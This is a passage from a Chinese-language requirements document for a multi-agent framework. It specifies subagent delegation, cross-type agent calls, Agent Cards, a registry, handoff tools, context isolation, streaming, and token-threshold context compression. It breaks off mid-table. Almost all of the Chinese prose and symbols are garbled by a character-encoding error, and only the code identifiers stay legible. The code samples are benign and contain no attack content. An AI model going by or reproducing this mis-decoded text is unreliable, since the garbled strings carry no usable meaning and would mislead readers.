- âœ… Subagentå¯ä»¥ä½¿ç”¨ä¸»Agent @mentionedçš„å·¥å…·
- âœ… Subagentå¯ä»¥è®¿é—®ä¸»Agentçš„å·¥ä½œåŒºæ–‡ä»¶
- âœ… æ”¯æŒå®æ—¶æµå¼è¾“å‡º(ç”¨æˆ·å¯è§è¿›åº¦)
- âœ… è¿”å›JSONåŒ…å«ok/result/loopså­—æ®µ

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/tools/builtin/delegate_task.py:38-200` - delegate_taskå®ç°
- `generalAgent/graph/nodes/planner.py:360-376` - çˆ¶çŠ¶æ€å­˜å‚¨
- `generalAgent/tools/builtin/delegate_task.py:29-35` - set_parent_state()

---

#### éœ€æ±‚ 2:call_agentå·¥å…·(è·¨ç±»å‹è°ƒç”¨)

**åŠŸèƒ½æè¿°**:
è°ƒç”¨å…¶ä»–ç±»å‹Agentæ‰§è¡Œä»»åŠ¡,åŸºäºAgent Cardæ ‡å‡†(A2A Protocol)å®ç°èƒ½åŠ›å‘ç°å’Œè°ƒç”¨ã€‚

**å·¥å…·ç­¾å**:
```python
@tool
async def call_agent(
    agent_id: str,
    task: str,
    max_loops: Optional[int] = None,
    template: Optional[str] = None,
    tools: Optional[list[str]] = None,
    model_type: Optional[str] = None,
    state: Annotated[dict, InjectedState] = None,
    tool_call_id: Annotated[str, InjectedToolCallId] = None,
) -> Command:
    """è°ƒç”¨å…¶ä»–agentæ‰§è¡Œä»»åŠ¡"""
```

**å‚æ•°è¯´æ˜**:
- `agent_id`: Agent ID(å¦‚"simple", "general")
- `task`: ä»»åŠ¡æè¿°(å¿…é¡»è¯¦ç»†,ç›®æ ‡agentæ— æ³•è®¿é—®è°ƒç”¨è€…å†å²)
- `max_loops`: æœ€å¤§å¾ªç¯æ¬¡æ•°(ä»…å¯¹GeneralAgentæœ‰æ•ˆ)
- `template`: Promptæ¨¡æ¿(ä»…å¯¹SimpleAgentæœ‰æ•ˆ)
- `tools`: å·¥å…·åˆ—è¡¨(ä»…å¯¹SimpleAgentæœ‰æ•ˆ)
- `model_type`: æ¨¡å‹ç±»å‹(base/reasoning/codeç­‰)

**æ”¯æŒçš„Agentç±»å‹**:

**SimpleAgent** (`agent_id="simple"`):
- ç‰¹ç‚¹:æ— çŠ¶æ€ã€å•æ¬¡è°ƒç”¨ã€å¿«é€Ÿå“åº”
- Skills:
  - `quick_analysis`: å¿«é€Ÿåˆ†æå•ä¸ªæ–‡ä»¶(<100è¡Œä»£ç )
  - `reasoning_task`: ä½¿ç”¨æ¨ç†æ¨¡å‹è§£å†³æ•°å­¦/é€»è¾‘é—®é¢˜
  - `code_review`: å¿«é€Ÿä»£ç å®¡æŸ¥(è¯­æ³•/é£æ ¼/å®‰å…¨)
- é…ç½®:`enabled: true`, `available_to_subagent: true`

**GeneralAgent** (`agent_id="general"`):
- ç‰¹ç‚¹:æœ‰çŠ¶æ€ã€å¤šè½®å¯¹è¯ã€æŠ€èƒ½ç³»ç»Ÿ
- Skills:
  - `complex_document_analysis`: åˆ†æå¤§å‹æ–‡æ¡£(>10é¡µPDF/DOCX)
  - `skill_based_task`: ä½¿ç”¨æŠ€èƒ½åŒ…çš„ä»»åŠ¡(@pdf/@docxç­‰)
  - `multi_step_research`: å¤šæ­¥éª¤ç ”ç©¶ä»»åŠ¡
- é…ç½®:`enabled: false`, `available_to_subagent: false`(é˜²æ­¢æ— é™é€’å½’)

**æ‰§è¡Œæµç¨‹**:
1. æ£€æŸ¥agent_registryæ˜¯å¦åˆå§‹åŒ–
2. éªŒè¯agent_idæ˜¯å¦å­˜åœ¨
3. æ£€æŸ¥agentæ˜¯å¦enabledæˆ–é€šè¿‡@mentionæ¿€æ´»
4. æ ¹æ®agentç±»å‹è°ƒç”¨å¯¹åº”å·¥å‚:
   - SimpleAgent: è°ƒç”¨`SimpleAgent.execute()`
   - GeneralAgent: è°ƒç”¨`build_application()`å¹¶æ‰§è¡Œ
5. è¿”å›Commandå¯¹è±¡:
   ```python
   Command(
       update={
           "messages": [ToolMessage(content=result, tool_call_id=tool_call_id)]
       }
   )
   ```

**ä¸delegate_taskçš„åŒºåˆ«**:
- `delegate_task`: è°ƒç”¨è‡ªèº«å‰¯æœ¬,ç»§æ‰¿çŠ¶æ€,é€‚åˆæ·±åº¦è¿­ä»£
- `call_agent`: è°ƒç”¨ä¸åŒç±»å‹Agent,èƒ½åŠ›åˆ‡æ¢,é€‚åˆå¿«é€Ÿä»»åŠ¡

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒè°ƒç”¨SimpleAgentå’ŒGeneralAgent
- âœ… Agentä¸å­˜åœ¨æ—¶è¿”å›æ¸…æ™°é”™è¯¯æç¤º
- âœ… æ”¯æŒSimpleAgentçš„template/toolså‚æ•°
- âœ… è¿”å›Commandå¯¹è±¡æ›´æ–°çˆ¶çŠ¶æ€
- âœ… æ”¯æŒ@mentionåŠ¨æ€åŠ è½½agent

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/tools/builtin/call_agent.py:38-200` - call_agentå®ç°
- `generalAgent/agents/registry.py` - AgentRegistry
- `generalAgent/agents/handoff_tools.py` - transfer_to_{agent_id}è‡ªåŠ¨ç”Ÿæˆ
- `generalAgent/config/agents.yaml` - Agenté…ç½®

---

#### éœ€æ±‚ 3:Agent Cardæ ‡å‡†(A2A Protocol)

**åŠŸèƒ½æè¿°**:
åŸºäºA2A Protocolå®šä¹‰Agentå…ƒæ•°æ®æ ‡å‡†,æ”¯æŒèƒ½åŠ›å‘ç°ã€æŠ€èƒ½æŸ¥è¯¢ã€è‡ªåŠ¨æ–‡æ¡£ç”Ÿæˆã€‚

**Agent Cardç»“æ„**:
```python
@dataclass
class AgentCard:
    # Identity
    id: str                    # Agentå”¯ä¸€æ ‡è¯†
    name: str                  # æ˜¾ç¤ºåç§°
    description: str           # ç®€çŸ­æè¿°
    provider: str              # æä¾›æ–¹(local/remote)
    version: str               # ç‰ˆæœ¬å·

    # Service Endpoint
    factory_path: str          # å·¥å‚å‡½æ•°è·¯å¾„

    # Capabilities (èƒ½åŠ›ç‰¹æ€§)
    capabilities: List[Capability]
    # ç¤ºä¾‹: stateless, fast, single_turn, template_support

    # Skills (æŠ€èƒ½æ¸…å•) â­ æ ¸å¿ƒéƒ¨åˆ†
    skills: List[Skill]
    # æ¯ä¸ªskillåŒ…å«: name, description, input_mode, output_mode, examples, parameters

    # Metadata
    tags: List[str]            # æ ‡ç­¾
    enabled: bool              # æ˜¯å¦å¯ç”¨
    always_available: bool     # æ˜¯å¦å…¨å±€å¯ç”¨
    available_to_subagent: bool  # å­agentæ˜¯å¦å¯è°ƒç”¨
```

**Skillå®šä¹‰**:
```python
@dataclass
class Skill:
    name: str                  # æŠ€èƒ½åç§°
    description: str           # è¯¦ç»†æè¿°
    input_mode: str            # text | json | structured | multimodal
    output_mode: str           # text | json | markdown | stream
    examples: List[str]        # ä½¿ç”¨ç¤ºä¾‹
    parameters: Dict[str, str] # å‚æ•°è¯´æ˜
```

**é…ç½®ç¤ºä¾‹**(agents.yaml):
```yaml
optional:
  simple:
    name: "SimpleAgent"
    description: "è½»é‡çº§Agent,é€‚åˆå¿«é€Ÿæ‰§è¡Œç®€å•ä»»åŠ¡"
    provider: "local"
    version: "1.0.0"
    factory_path: "simpleAgent.simple_agent:SimpleAgent"

    capabilities:
      - name: "stateless"
        description: "æ— çŠ¶æ€,ä¸ä¿ç•™ä¼šè¯å†å²"
      - name: "fast"
        description: "å¿«é€Ÿå“åº”,æ— éœ€åˆå§‹åŒ–å¼€é”€"

    skills:
      - name: "quick_analysis"
        description: "å¿«é€Ÿåˆ†æå•ä¸ªæ–‡ä»¶"
        input_mode: "text"
        output_mode: "markdown"
        examples:
          - "åˆ†æuploads/script.pyçš„å¤æ‚åº¦"
        parameters:
          file_path: "è¦åˆ†æçš„æ–‡ä»¶è·¯å¾„"

    tags: ["lightweight", "stateless", "fast"]
    enabled: true
    available_to_subagent: true
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… AgentCardåŒ…å«å®Œæ•´çš„identity/endpoint/capabilities/skillsä¿¡æ¯
- âœ… SkillsåŒ…å«exampleså’Œparametersä¾¿äºLLMç†è§£
- âœ… æ”¯æŒä»agents.yamlè‡ªåŠ¨åŠ è½½AgentCard
- âœ… AgentRegistryæä¾›æŸ¥è¯¢æ¥å£(by id/skill/tag)

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/agents/schema.py` - AgentCard/Skill/Capabilityå®šä¹‰
- `generalAgent/config/agents.yaml` - Agenté…ç½®æ–‡ä»¶
- `generalAgent/agents/scanner.py` - è‡ªåŠ¨æ‰«æå’ŒåŠ è½½

---

#### éœ€æ±‚ 4:AgentRegistryæ³¨å†Œè¡¨

**åŠŸèƒ½æè¿°**:
AgentRegistryè´Ÿè´£ç®¡ç†æ‰€æœ‰Agentçš„å…ƒæ•°æ®,æä¾›å‘ç°ã€æŸ¥è¯¢ã€catalogç”ŸæˆåŠŸèƒ½ã€‚

**æ ¸å¿ƒæ–¹æ³•**:

**4.1 æ³¨å†Œä¸æŸ¥è¯¢**
```python
class AgentRegistry:
    def register(self, card: AgentCard):
        """æ³¨å†ŒAgent Card"""

    def get(self, agent_id: str) -> AgentCard:
        """æ ¹æ®IDè·å–Agent Card"""

    def is_discovered(self, agent_id: str) -> bool:
        """æ£€æŸ¥Agentæ˜¯å¦è¢«å‘ç°"""

    def is_enabled(self, agent_id: str) -> bool:
        """æ£€æŸ¥Agentæ˜¯å¦å¯ç”¨"""
```

**4.2 åˆ—è¡¨æŸ¥è¯¢**
```python
    def list_discovered(self) -> List[AgentCard]:
        """åˆ—å‡ºæ‰€æœ‰å·²å‘ç°çš„agents"""

    def list_enabled(self) -> List[AgentCard]:
        """åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„agents"""

    def list_by_skill(self, skill_name: str) -> List[AgentCard]:
        """æ ¹æ®skillæŸ¥è¯¢agents"""

    def list_by_tag(self, tag: str) -> List[AgentCard]:
        """æ ¹æ®tagæŸ¥è¯¢agents"""
```

**4.3 Catalogç”Ÿæˆ**
```python
    def get_catalog_text(self, mode: str = "compact") -> str:
        """ç”Ÿæˆagents catalogæ–‡æœ¬

        Args:
            mode: compact(ç²¾ç®€) | detailed(è¯¦ç»†)

        Returns:
            ç”¨äºSystemMessageçš„catalogæ–‡æœ¬
        """
```

**Catalogæ ¼å¼**:

**Compactæ¨¡å¼**(é»˜è®¤,èŠ‚çœtokens):
```markdown
## å¯ç”¨ Agents

- **simple**: è½»é‡çº§Agent,é€‚åˆå¿«é€Ÿæ‰§è¡Œç®€å•ä»»åŠ¡
- **general**: å®Œæ•´åŠŸèƒ½çš„Agent,æ”¯æŒæŠ€èƒ½ã€å¤šè½®å¯¹è¯(å½“å‰ç¦ç”¨)
```

**Detailedæ¨¡å¼**(@mentionæ—¶æ˜¾ç¤º):
```markdown
## SimpleAgent (@simple)

**èƒ½åŠ›**:
- stateless: æ— çŠ¶æ€,ä¸ä¿ç•™ä¼šè¯å†å²
- fast: å¿«é€Ÿå“åº”,æ— éœ€åˆå§‹åŒ–å¼€é”€

**æŠ€èƒ½**:
1. quick_analysis - å¿«é€Ÿåˆ†æå•ä¸ªæ–‡ä»¶
   - ç¤ºä¾‹:"åˆ†æuploads/script.pyçš„å¤æ‚åº¦"
2. reasoning_task - ä½¿ç”¨æ¨ç†æ¨¡å‹è§£å†³æ•°å­¦/é€»è¾‘é—®é¢˜
   - ç¤ºä¾‹:"è®¡ç®—fibonacci(100)"
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒä¸‰å±‚æ¶æ„:discovered â†’ enabled â†’ mentioned
- âœ… Catalogé»˜è®¤ç²¾ç®€æ¨¡å¼(å‡å°‘SystemMessage tokens)
- âœ… @mentionæ—¶åŠ¨æ€æ˜¾ç¤ºè¯¦ç»†æŠ€èƒ½ä¿¡æ¯
- âœ… æ”¯æŒby_skill/by_tagæŸ¥è¯¢

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/agents/registry.py` - AgentRegistryå®ç°
- `generalAgent/agents/scanner.py:scan_agents_from_config()` - è‡ªåŠ¨åŠ è½½

---

#### éœ€æ±‚ 5:Handoff Patternå®ç°

**åŠŸèƒ½æè¿°**:
ä¸ºæ¯ä¸ªenabled agentè‡ªåŠ¨ç”Ÿæˆ`transfer_to_{agent_id}`å·¥å…·,æ”¯æŒLangGraphçš„Handoff Patternã€‚

**è‡ªåŠ¨ç”Ÿæˆé€»è¾‘**:
```python
def generate_handoff_tool(agent_id: str, card: AgentCard) -> BaseTool:
    """ä¸ºagentç”Ÿæˆtransfer_to_{agent_id}å·¥å…·

    ç¤ºä¾‹: transfer_to_simple, transfer_to_general
    """
    @tool
    async def transfer_tool(task: str) -> Command:
        # è°ƒç”¨call_agent
        return await call_agent(agent_id=agent_id, task=task, ...)

    transfer_tool.name = f"transfer_to_{agent_id}"
    transfer_tool.description = f"è½¬äº¤ä»»åŠ¡ç»™{card.name}: {card.description}"
    return transfer_tool
```

**ä½¿ç”¨åœºæ™¯**:
1. **ç”¨æˆ·æ˜¾å¼@mention**:
   ```
   User> @simple åˆ†æscript.py
   System> [åŠ è½½SimpleAgent,æ˜¾ç¤ºè¯¦ç»†æŠ€èƒ½]
          [ç”Ÿæˆtransfer_to_simpleå·¥å…·]
   LLM> [è°ƒç”¨transfer_to_simple("åˆ†æscript.py...")]
   ```

2. **LLMè‡ªä¸»é€‰æ‹©**:
   ```
   User> å¿«é€Ÿåˆ†æä¸€ä¸‹è¿™æ®µä»£ç 
   LLM> [æ£€æµ‹åˆ°"å¿«é€Ÿ"å…³é”®è¯]
        [é€‰æ‹©transfer_to_simpleå·¥å…·]
        [è°ƒç”¨SimpleAgentæ‰§è¡Œ]
   ```

**Handoff Flow**:
```
Main Agent â†’ LLMå†³ç­– â†’ transfer_to_{agent_id}
                      â†“
                  call_agent()
                      â†“
                  Target Agentæ‰§è¡Œ
                      â†“
                  è¿”å›Command(update state)
                      â†“
                  Main Agentç»§ç»­
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ¯ä¸ªenabled agentè‡ªåŠ¨ç”Ÿæˆtransfer_toå·¥å…·
- âœ… @mentionæ—¶åŠ¨æ€åŠ è½½transfer_toå·¥å…·
- âœ… å·¥å…·æè¿°åŒ…å«agentçš„èƒ½åŠ›å’ŒæŠ€èƒ½
- âœ… è¿”å›Commandå¯¹è±¡æ›´æ–°çˆ¶çŠ¶æ€

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/agents/handoff_tools.py` - generate_handoff_tool()
- `generalAgent/graph/nodes/planner.py:150-180` - åŠ¨æ€åŠ è½½handoffå·¥å…·

---

#### éœ€æ±‚ 6:ä¸Šä¸‹æ–‡éš”ç¦»ä¸ç»§æ‰¿

**åŠŸèƒ½æè¿°**:
Subagentæ‹¥æœ‰ç‹¬ç«‹context_id,ä¸çˆ¶Agentéš”ç¦»,ä½†å¯ä»¥é€‰æ‹©æ€§ç»§æ‰¿å·¥å…·ã€æŠ€èƒ½ã€å·¥ä½œåŒºã€‚

**éš”ç¦»æœºåˆ¶**:

**AppState.context_idå­—æ®µ**:
- ä¸»Agent: `context_id = "main"`
- Subagent: `context_id = "subagent-{uuid[:8]}"`
- ç”¨äºåŒºåˆ†ä¸åŒæ‰§è¡Œä¸Šä¸‹æ–‡

**AppState.parent_contextå­—æ®µ**:
- Subagentè®°å½•çˆ¶Agentçš„context_id
- ç”¨äºè¿½è¸ªè°ƒç”¨é“¾: main â†’ subagent-abc â†’ subagent-xyz

**ç»§æ‰¿è§„åˆ™**:

**delegate_taskç»§æ‰¿**(åŒç±»å‹):
```python
delegated_state = {
    "context_id": "subagent-abc123",
    "parent_context": parent_state.get("context_id", "main"),

    # âœ… ç»§æ‰¿
    "mentioned_agents": list(parent_mentioned_agents),
    "active_skill": parent_active_skill,
    "workspace_path": parent_workspace,
    "uploaded_files": list(parent_uploaded_files),

    # âŒ ç‹¬ç«‹
    "messages": [HumanMessage(task)],  # ç‹¬ç«‹å¯¹è¯å†å²
    "todos": [],                        # ç‹¬ç«‹ä»»åŠ¡åˆ—è¡¨
    "loops": 0,                         # ç‹¬ç«‹å¾ªç¯è®¡æ•°
}
```

**call_agentç»§æ‰¿**(è·¨ç±»å‹):
- SimpleAgent: ä¸ç»§æ‰¿(æ— çŠ¶æ€,æ¯æ¬¡å…¨æ–°åˆ›å»º)
- GeneralAgent: å¯é€‰ç»§æ‰¿(é€šè¿‡å‚æ•°æ§åˆ¶)

**éªŒæ”¶æ ‡å‡†**:
- âœ… Subagentçœ‹ä¸åˆ°ä¸»å¯¹è¯å†å²(messagesç‹¬ç«‹)
- âœ… Subagentå¯ä»¥ä½¿ç”¨ä¸»Agentçš„å·¥å…·(@mentioned)
- âœ… Subagentå¯ä»¥è®¿é—®ä¸»Agentçš„å·¥ä½œåŒº
- âœ… æ”¯æŒcontext_idè¿½è¸ªè°ƒç”¨é“¾

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/graph/state.py:40-42` - context_id/parent_contextå®šä¹‰
- `generalAgent/tools/builtin/delegate_task.py:106-125` - ç»§æ‰¿é€»è¾‘
- `generalAgent/tools/builtin/delegate_task.py:29-35` - çˆ¶çŠ¶æ€å­˜å‚¨

---

#### éœ€æ±‚ 7:æµå¼è¾“å‡ºä¸è¿›åº¦å¯è§

**åŠŸèƒ½æè¿°**:
Subagentæ‰§è¡Œè¿‡ç¨‹å®æ—¶æµå¼è¾“å‡º,ç”¨æˆ·å¯ä»¥çœ‹åˆ°è¿›åº¦å’Œä¸­é—´ç»“æœã€‚

**å®ç°æ–¹å¼**:

**delegate_taskæµå¼è¾“å‡º**:
```python
# ä½¿ç”¨astreamå®æ—¶è·å–çŠ¶æ€å¿«ç…§
async for state_snapshot in app_graph.astream(
    delegated_state,
    config=config,
    stream_mode="values"
):
    final_state = state_snapshot

    # æ‰“å°æ–°æ¶ˆæ¯
    current_messages = state_snapshot.get("messages", [])
    for idx in range(message_count, len(current_messages)):
        msg = current_messages[idx]
        if hasattr(msg, "content"):
            content = str(msg.content)
            print(f"[subagent] {content[:200]}...")
```

**è¾“å‡ºç¤ºä¾‹**:
```
[subagent-abc123] Starting execution...
[subagent] Loop 1: æ­£åœ¨æœç´¢Python 3.13æ–‡æ¡£...
[subagent] Loop 2: æ‰¾åˆ°15ä¸ªæ–°ç‰¹æ€§
[subagent] Loop 3: æ­£åœ¨åˆ†æPEPææ¡ˆ...
[subagent] Loop 4: ç”Ÿæˆå¯¹æ¯”è¡¨æ ¼...
[subagent] Completed in 4 loops
```

**call_agentè¾“å‡º**:
- SimpleAgent: å•æ¬¡è¾“å‡º(æ— loop)
- GeneralAgent: æ”¯æŒæµå¼è¾“å‡º(å¦‚æœå®ç°)

**éªŒæ”¶æ ‡å‡†**:
- âœ… Subagentæ¯æ¡æ¶ˆæ¯å®æ—¶æ‰“å°
- âœ… æ˜¾ç¤ºcontext_idä¾¿äºè¿½è¸ª
- âœ… æ˜¾ç¤ºloopè®¡æ•°å’Œå®ŒæˆçŠ¶æ€
- âœ… é•¿å†…å®¹è‡ªåŠ¨æˆªæ–­(å‰200å­—ç¬¦)

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/tools/builtin/delegate_task.py:136-165` - æµå¼è¾“å‡ºå®ç°
- `generalAgent/cli.py:180-250` - CLIæµå¼è¾“å‡ºé›†æˆ

---

### å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | æ–‡ä»¶è·¯å¾„ | è¯´æ˜ |
|---------|---------|------|
| delegate_taskå·¥å…· | `generalAgent/tools/builtin/delegate_task.py` | åŒç±»å‹å‰¯æœ¬å§”æ´¾ |
| call_agentå·¥å…· | `generalAgent/tools/builtin/call_agent.py` | è·¨ç±»å‹agentè°ƒç”¨ |
| AgentCardå®šä¹‰ | `generalAgent/agents/schema.py` | A2A Protocolæ ‡å‡† |
| AgentRegistry | `generalAgent/agents/registry.py` | Agentæ³¨å†Œè¡¨ |
| Agentæ‰«æå™¨ | `generalAgent/agents/scanner.py` | è‡ªåŠ¨åŠ è½½agents.yaml |
| Handoffå·¥å…·ç”Ÿæˆ | `generalAgent/agents/handoff_tools.py` | transfer_to_{agent_id} |
| Agenté…ç½® | `generalAgent/config/agents.yaml` | Agent Cardé…ç½® |
| SimpleAgentå®ç° | `simpleAgent/simple_agent.py` | SimpleAgentæ ¸å¿ƒé€»è¾‘ |
| SimpleAgent Graph | `simpleAgent/graph/builder.py` | SimpleAgent LangGraph |
| Plannerçˆ¶çŠ¶æ€å­˜å‚¨ | `generalAgent/graph/nodes/planner.py:360-376` | set_parent_state() |
| AppStateå®šä¹‰ | `generalAgent/graph/state.py:40-42` | context_id/parent_context |
| CLIæµå¼è¾“å‡º | `generalAgent/cli.py:180-250` | Subagentè¾“å‡ºé›†æˆ |

---

**å‚è§å…¶ä»–ç« èŠ‚**:
- ä¸‰ã€Agent æ¨¡æ¿ç³»ç»Ÿ - SimpleAgentå’ŒGeneralAgentè¯¦ç»†å®šä¹‰
- ä¸€ã€å·¥å…·ç³»ç»Ÿ - å·¥å…·ç»§æ‰¿å’Œavailable_to_subagentæœºåˆ¶
- å››ã€Agent æµç¨‹ä¸çŠ¶æ€ç®¡ç† - AppStateç»“æ„å’Œcontext_idéš”ç¦»

---

## å…­ã€ä¸Šä¸‹æ–‡ç®¡ç†

### äº§å“å®šä½

ä¸Šä¸‹æ–‡ç®¡ç†æ˜¯æ¡†æ¶çš„æ™ºèƒ½ä¼˜åŒ–å±‚,è´Ÿè´£ç›‘æ§ Token ä½¿ç”¨ã€è‡ªåŠ¨å‹ç¼©å†å²ã€ç®¡ç†ä¼šè¯æŒä¹…åŒ–ã€‚é€šè¿‡ä¸‰çº§é˜ˆå€¼ç›‘æ§(75%/85%/95%)å’Œ LLM å‹ç¼©ç­–ç•¥,åœ¨ä¸ä¸­æ–­å¯¹è¯çš„æƒ…å†µä¸‹é‡Šæ”¾ Token ç©ºé—´,é™ä½APIæˆæœ¬60-80%,åŒæ—¶ä¿è¯å¯¹è¯è¯­ä¹‰å®Œæ•´æ€§ã€‚

**ä»·å€¼ä¸»å¼ **:
- **æˆæœ¬ä¼˜åŒ–**:KV Cache ä¼˜åŒ–é™ä½60-80%æ¨ç†æˆæœ¬,è‡ªåŠ¨å‹ç¼©å‡å°‘ Token æ¶ˆè€—
- **ç”¨æˆ·æ— æ„Ÿ**:å‹ç¼©è¿‡ç¨‹é™é»˜æ‰§è¡Œ,æ— é€šçŸ¥æ‰“æ‰°,å¯¹è¯ä½“éªŒè¿ç»­
- **æ™ºèƒ½å¹³è¡¡**:LLM å‹ç¼©ä¿ç•™è¯­ä¹‰,ç´§æ€¥æˆªæ–­ä¿è¯å¯é æ€§
- **ä¼šè¯æŒä¹…åŒ–**:SQLite å­˜å‚¨æ”¯æŒæ–­ç‚¹ç»­èŠ,æ¢å¤æ—¶é—´<500ms

---

### æ ¸å¿ƒåœºæ™¯

#### åœºæ™¯ 1:é•¿å¯¹è¯è‡ªåŠ¨ä¼˜åŒ–

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·ä¸Agentè¿›è¡Œ300è½®å¯¹è¯(~120K tokens),ç³»ç»Ÿéœ€è¦åœ¨ä¸ä¸­æ–­å¯¹è¯çš„æƒ…å†µä¸‹é‡Šæ”¾Tokenç©ºé—´ã€‚

**ç³»ç»Ÿè¡Œä¸º**:
1. PlannerèŠ‚ç‚¹æ£€æµ‹Tokenä½¿ç”¨ç‡è¾¾åˆ°95%
2. è‡ªåŠ¨è·¯ç”±åˆ°SummarizationèŠ‚ç‚¹
3. LLMå°†å‰290æ¡æ¶ˆæ¯å‹ç¼©ä¸º1æ¡æ‘˜è¦
4. ä¿ç•™æœ€è¿‘10æ¡æ¶ˆæ¯
5. è¿”å›PlannerèŠ‚ç‚¹ç»§ç»­æ‰§è¡Œ

**å…³é”®ç‚¹**:
- ç”¨æˆ·æ— æ„ŸçŸ¥(æ— å‹ç¼©é€šçŸ¥)
- å‹ç¼©æ¯”é«˜è¾¾95%
- å¯¹è¯è¯­ä¹‰å®Œæ•´ä¿ç•™

---

#### åœºæ™¯ 2:ä¼šè¯æ–­ç‚¹ç»­èŠ

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·åœ¨åŠå…¬å®¤ä¸Agentè®¨è®ºé¡¹ç›®éœ€æ±‚(50è½®å¯¹è¯),å…³é—­åº”ç”¨åå›å®¶ç»§ç»­è®¨è®º,ç³»ç»Ÿéœ€è¦å®Œæ•´æ¢å¤ä¸Šä¸‹æ–‡ã€‚

**ç³»ç»Ÿè¡Œä¸º**:
1. ç”¨æˆ·ä½¿ç”¨`/sessions`å‘½ä»¤æŸ¥çœ‹å†å²ä¼šè¯
2. é€‰æ‹©ä¼šè¯ID: `abc123`
3. ä½¿ç”¨`/load abc123`åŠ è½½ä¼šè¯
4. ç³»ç»Ÿä»SQLiteæ¢å¤:æ¶ˆæ¯å†å²ã€å·¥å…·çŠ¶æ€ã€æŠ€èƒ½ã€å·¥ä½œåŒºè·¯å¾„
5. ç”¨æˆ·ç»§ç»­æé—®,Agentç†è§£ä¹‹å‰çš„ä¸Šä¸‹æ–‡

**å…³é”®ç‚¹**:
- æ¢å¤æ—¶é—´<500ms
- 100%çŠ¶æ€æ¢å¤
- æ”¯æŒ1000+å¹¶å‘ä¼šè¯

---

#### åœºæ™¯ 3:KV Cacheæˆæœ¬ä¼˜åŒ–

**ç”¨æˆ·æ•…äº‹**:
å¼€å‘å›¢é˜Ÿä½¿ç”¨Agentå¤„ç†100è½®å¯¹è¯,ä¼ ç»Ÿæ–¹æ¡ˆæ¯è½®éƒ½é‡æ–°è®¡ç®—System Prompt(5K tokens),æ¶ˆè€—å¤§é‡æ¨ç†æˆæœ¬ã€‚

**ç³»ç»Ÿè¡Œä¸º**:
1. ç³»ç»Ÿå¯åŠ¨æ—¶ç”Ÿæˆå›ºå®šSystemMessage(åˆ†é’Ÿçº§æ—¶é—´æˆ³)
2. æ•´ä¸ªä¼šè¯æœŸé—´SystemMessageä¸å˜
3. åŠ¨æ€æé†’è¿½åŠ åˆ°æœ€åä¸€æ¡Human Message
4. KV Cacheå¤ç”¨ç‡è¾¾70-90%

**æˆæœ¬å¯¹æ¯”**:
- ä¼ ç»Ÿæ–¹æ¡ˆ:100è½® Ã— 5K tokens = 500K tokens
- ä¼˜åŒ–å:5K + 95è½® Ã— 0.5K = 52.5K tokens
- **æˆæœ¬é™ä½90%**

---

### åŠŸèƒ½éœ€æ±‚

#### éœ€æ±‚1:Tokenç›‘æ§ä¸ä¸‰çº§é˜ˆå€¼

**éœ€æ±‚æè¿°**:
å®ç°Tokenä½¿ç”¨ç‡ç›‘æ§,æ ¹æ®ä¸‰çº§é˜ˆå€¼(info/warning/critical)è§¦å‘ä¸åŒå“åº”ç­–ç•¥ã€‚

**é˜ˆå€¼å®šä¹‰**:

| çº§åˆ« | é˜ˆå€¼ | è¡Œä¸º | æ—¥å¿—çº§åˆ« |
|------|------|------|---------|
| normal | <75% | æ­£å¸¸æ‰§è¡Œ | INFO |
| info | 75%-85% | è®°å½•ä¿¡æ¯,åŠ¨æ€åŠ è½½compact_contextå·¥å…· | INFO |
| warning | 85%-95% | è­¦å‘Š,æ·»åŠ Tokenæé†’åˆ°æ¶ˆæ¯ | WARNING |
| critical | >95% | è·³è¿‡LLMè°ƒç”¨,è§¦å‘è‡ªåŠ¨å‹ç¼© | WARNING |

**ç›‘æ§é€»è¾‘**:

```python
# generalAgent/context/token_tracker.py
class TokenTracker:
    def check_status(
        self,
        cumulative_prompt_tokens: int,
        model_id: str
    ) -> ContextStatus:
        context_window = self.get_context_window(model_id)
        usage_ratio = cumulative_prompt_tokens / context_window

        if usage_ratio >= self.settings.critical_threshold:
            return ContextStatus(
                level="critical",
                usage_ratio=usage_ratio,
                message="âš ï¸ Tokenä½¿ç”¨ç‡>95%,è§¦å‘è‡ªåŠ¨å‹ç¼©"
            )
        elif usage_ratio >= self.settings.warning_threshold:
            return ContextStatus(
                level="warning",
                usage_ratio=usage_ratio,
                message=f"âš ï¸ Tokenä½¿ç”¨ç‡: {usage_ratio:.1%}"
            )
        # ... å…¶ä»–çº§åˆ«
```

**é…ç½®å‚æ•°**(.env):

```bash
CONTEXT_INFO_THRESHOLD=0.75        # 75% ä¿¡æ¯æç¤º
CONTEXT_WARNING_THRESHOLD=0.85     # 85% è­¦å‘Š
CONTEXT_CRITICAL_THRESHOLD=0.95    # 95% å¼ºåˆ¶å‹ç¼©
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒä¸‰çº§é˜ˆå€¼é…ç½®(0.6-0.99)
- âœ… å®æ—¶è®¡ç®—usage_ratio
- âœ… æ ¹æ®é˜ˆå€¼è¿”å›æ­£ç¡®çš„ContextStatus
- âœ… è®°å½•å®Œæ•´çš„Tokenè¿½è¸ªæ—¥å¿—

**å®ç°å‚è€ƒ**:`generalAgent/context/token_tracker.py`

---

#### éœ€æ±‚2:è‡ªåŠ¨ä¸Šä¸‹æ–‡å‹ç¼©

**éœ€æ±‚æè¿°**:
Tokenä½¿ç”¨ç‡>95%æ—¶è‡ªåŠ¨è§¦å‘LLMå‹ç¼©,å°†æ—§æ¶ˆæ¯æ€»ç»“ä¸ºæ‘˜è¦,ä¿ç•™æœ€è¿‘å¯¹è¯ã€‚

**å‹ç¼©ç­–ç•¥**:

| ç­–ç•¥ | è§¦å‘æ¡ä»¶ | ä¿ç•™å†…å®¹ | å‹ç¼©æ–¹å¼ |
|------|---------|---------|---------|
